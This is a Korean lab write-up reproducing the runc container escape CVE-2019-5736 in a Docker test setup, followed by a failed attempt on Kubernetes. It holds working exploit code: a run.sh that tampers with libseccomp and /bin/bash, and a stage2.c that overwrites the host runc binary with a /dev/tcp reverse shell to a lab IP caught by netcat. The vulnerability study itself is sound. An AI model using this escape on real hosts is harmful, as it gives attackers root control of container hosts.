
# 취약점 설명

CVE-2019-5736취약점은
도커 컨테이너 CLI 툴인 runc에서 발생한다.


컨테이너 내에서 실행되는 프로세스들은 호스트 시스템의 파일 디스크립터를 공유하여 사용한다. 

그러나 runC는 호스트 시스템에서 파일 디스크립터를 다시 열고 그것을 컨테이너 내의 프로세스에 전달하는 기능을 가지고 있다. 

이 과정에서 파일 디스크립터를 전달 받은 프로세스는 그 파일 디스크립터가 소유하는 파일에 대한 제어 권한을 가지게 되는데, 

이때 runC가 제공하는 파일 디스크립터 전달 방식의 버그로 인해, 컨테이너 내부의 악성 코드가 호스트 시스템의 파일 디스크립터를 이용하여 

호스트 시스템에서 원하는 동작을 수행할 수 있게 된다  

   
  
</br>
</br>
</br>
  
# 취약점 구현

## 구현 환경 
### 희생자: Ubuntu 18.04, Docker-ce 18.06.1~ce~3-0~ubuntu
### 공격자: Ubuntu 16.04


희생자 PC에 Docker을 설치한다.

설치 과정은 Docker 공식 문서를 따르며 버전을 지정하여 설치한다.
</br>
</br>

      $sudo apt-get update
      $sudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common
      $curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
      $sudo add-apt-repository \
      "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
      $sudo apt-get update
      
</br>
</br>    

apt-cache madison 명령어를 통해 repository에서 설치 가능한 Docker 버전을 확인할 수 있다.

      $sudo apt-cache madison docker-ce
      $sudo apt-get install docker-ce=18.06.1~ce~3-0~ubuntu
      
</br>
</br>

취약점 구현을 위해 Docker 버전을 18.06 버전으로 설치한다.

      $cat <<EOF | sudo tee /etc/docker/daemon.json
      {
       "exec-opts": ["native.cgroupdriver=systemd"],
        "log-driver": "json-file",
        "log-opts": {
          "max-size": "100m"
        },
        "storage-driver": "overlay2"
      }
      EOF
      
      
      $sudo systemctl daemon-reload
      $sudo systemctl restart docker.service
      
</br>
</br>

      $git clone https://github.com/agppp/cve-2019-5736-poc

공개된 poc 코드를 다운받는다.


![1](https://github.com/khu-capstone-design/kubernetes-vulnerability-investigation/assets/72953981/20e21171-09d6-473f-96ad-1c1558884a58)


poc코드를 현재 host pc 환경에 맞게 수정한다.

</br>
</br>

run.sh
libseccomp 버전을 host pc 버전에 맞게 설정한다.


![2](https://github.com/khu-capstone-design/kubernetes-vulnerability-investigation/assets/72953981/b21abe2c-0a2d-48fa-a10f-7cf3c78afa90)


</br>
</br>

      #!/bin/bash
      cd /root/libseccomp-2.5.1
      cat /root/stage1.c >> src/api.c
      DEB_BUILD_OPTIONS=nocheck dpkg-buildpackage -b -uc -us
      dpkg -i /root/*.deb
      mv /bin/bash /bin/good_bash
      gcc /root/stage2.c -o /stage2
      cat >/bin/bash <<EOF
      #!/proc/self/exe
      EOF
      chmod +x /bin/bash
                           
stage2.c
                           
#include <string.h>

#include <unistd.h>            
를 추가하고 아이피를 공격자 아이피로 설정한다.
</br>
</br>

      #include <stdio.h>
      #include <sys/types.h>
      #include <sys/stat.h>
      #include <fcntl.h>
      #include <errno.h>
      #include <string.h>
      #include <unistd.h>
      int main(int argc, char **argv) {

          printf("HAX2: argv: %s\n", argv[1]);
          int res1 = -1;
          int total = 10000;
          while(total>0 && res1== -1){

              int fd = open(argv[1], O_RDWR|O_TRUNC);
              printf("HAX2: fd: %d\n", fd);




              const char *poc = "#!/bin/bash\n/bin/bash -i >& /dev/tcp/192.168.100.12/4455 0>&1  &\n";
              int res = write(fd, poc, strlen(poc));
              printf("HAX2: res: %d, %d\n", res, errno);
              res1 = res;
              total--;
          }
      }
      
</br>
</br>

설정한 파일들을 토대로 Dockerfile을 통해 이미지를 빌드한다.

</br>
</br>

      $docker build -t cve .
      
</br>
</br>

![3](https://github.com/khu-capstone-design/kubernetes-vulnerability-investigation/assets/72953981/7951e231-f754-4aea-9087-72878e7fdbf0)

빌드한 이미지를 통해 컨테이너를 만든다.

</br>
</br>

      $docker run -t -d --name cvetest cve
      
</br>
</br>      

![4](https://github.com/khu-capstone-design/kubernetes-vulnerability-investigation/assets/72953981/2acc5d0d-6430-4347-a518-3d13e64f8609)

테스트 진행 후 파일이 변경되므로 미리 백업을 한다

</br>
</br>

      $sudo cp /usr/bin/docker-runc /usr/bin/docker-runc.bak
      
</br>
</br>  

올라간 컨테이너에 접속하여 파일을 실행한다

</br>
</br>

      $docker exec -it cvetest /bin/sh
      $cd /root && ./run.sh && exit
      
</br>
</br>

![5](https://github.com/khu-capstone-design/kubernetes-vulnerability-investigation/assets/72953981/45fe615c-10ee-4307-b054-16690d114367)


공격자 pc에서 port 4455번에 대해 listen상태를 활성화 시킨다

</br>
</br>

      $nc -nlvvp 4455
      
</br>
</br>  

![6](https://github.com/khu-capstone-design/kubernetes-vulnerability-investigation/assets/72953981/b655e5cb-da1a-489d-aa05-0318111dca37)

희생자 pc에서 다시 한번 컨테이너에 파일을 실행시킨다

</br>
</br>

      $docker exec -it cvetest /bin/bash
      
</br>
</br>  

![7](https://github.com/khu-capstone-design/kubernetes-vulnerability-investigation/assets/72953981/9ed9d64b-d56e-4e85-976b-cb430d5be07c)


공격자 pc에서 희생자 pc의 루트 권한으로 접속하게 된다


![8](https://github.com/khu-capstone-design/kubernetes-vulnerability-investigation/assets/72953981/69cf7a9b-993e-4827-b483-03733c08c04f)


## Kubernetes에서 구현 (실패)

취약점이 적용되는 Docker의 버전에 맞게 Kubernetes도 1.11버전으로 설치한다(control plane, worker node 포함)

</br>
</br>

      $sudo curl -fsSLo /usr/share/keyrings/kubernetes-archive-keyring.gpg https://packages.cloud.google.com/apt/doc/apt-key.gpg
      $echo "deb [signed-by=/usr/share/keyrings/kubernetes-archive-keyring.gpg] https://apt.kubernetes.io/ kubernetes-xenial main" | sudo tee /etc/apt/sources.list.d/kubernetes.list
      $sudo apt-get update -y
      $sudo apt-get install kubernetes-cni=0.6.0-00
      $sudo apt-get install -y kubelet=1.11.0-00 kubeadm=1.11.0-00 kubectl=1.11.0-00


</br>
</br>


설치한 kubelet, kubeadm, kubectl 버전을 고정시킨다

</br>
</br>

      $sudo apt-mark hold kubelet kubeadm kubectl

</br>
</br>

(control plane에만 진행) worker node에 kubeadm을 통해 배포를 하기 위해

control plane에서 kubernetes cluster를 구성한다

아이피는 nat network 대역대를 사용한다

</br>
</br>

      $sudo swapoff -a
      $sudo kubeadm init --apiserver-cert-extra-sans 192.168.100.10 --pod-network-cidr 192.168.0.0/16 --apiserver-advertise-address 192.168.100.10
 
</br>
</br>

![9](https://github.com/khu-capstone-design/kubernetes-vulnerability-investigation/assets/72953981/ce9a0be2-4423-4b1a-8196-f6e27cab6f9f)


설치 후에 나오는 명령어와 worker node에 사용하기 위해 토큰값을 통해 연결하는 명령어를 입력한다

</br>
</br>

      $mkdir -p $HOME/.kube
      $sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config
      $sudo chown $(id -u):$(id -g) $HOME/.kube/config

</br>
</br>

kubernetes cluster network를 위해 flannel을 설치한다.

flannel 아이피 대역을 바꾸기 위해 flannel 파일을 우선 다운로드한다

</br>
</br>

      $curl -O https://raw.githubusercontent.com/coreos/flannel/v0.10.0/Documentation/kube-flannel.yml
      
10.0 대역으로 되어 있는 아이피 대역을 nat network 대역으로 바꾸고 flannel을 설치한다

![10](https://github.com/khu-capstone-design/kubernetes-vulnerability-investigation/assets/72953981/32acf920-f3bd-4243-b1c2-cf68b665a86c)

</br>
</br>

      $kubectl apply -f kube-flannel.yml
      
      

kubeadm init 명령어로 나온 명령어를 worker node에 입력한다

![11](https://github.com/khu-capstone-design/kubernetes-vulnerability-investigation/assets/72953981/32486927-4c3d-416b-831c-b67c6a988a5d)



kubectl get nodes 명령어로 cluster가 구성되었음을 확인할 수 있다

![12](https://github.com/khu-capstone-design/kubernetes-vulnerability-investigation/assets/72953981/564946f7-efc5-4e52-8379-ca6fa865e1f4)

앞서 Docker에서 만든 이미지를 Docker hub에 push한 뒤 pod 파일을 만들어 pod를 동작시킨다

pod.yaml

</br>
</br>

      apiVersion: v1

      kind: Pod

      metadata:

        name: nginx

      spec:

        containers:

        - name: nginx

          image: (도커허브에 올린 이미지)

          ports:

          - containerPort: 80

</br>
</br>

만든 pod를 실행시킨다

      $kubectl create -f pod.yaml
      

그러나 CrashLoopBack 오류로 인해 동작이 불가능


![13](https://github.com/khu-capstone-design/kubernetes-vulnerability-investigation/assets/72953981/1ae073a4-6008-4ef8-9bd5-91485fab5aaf)
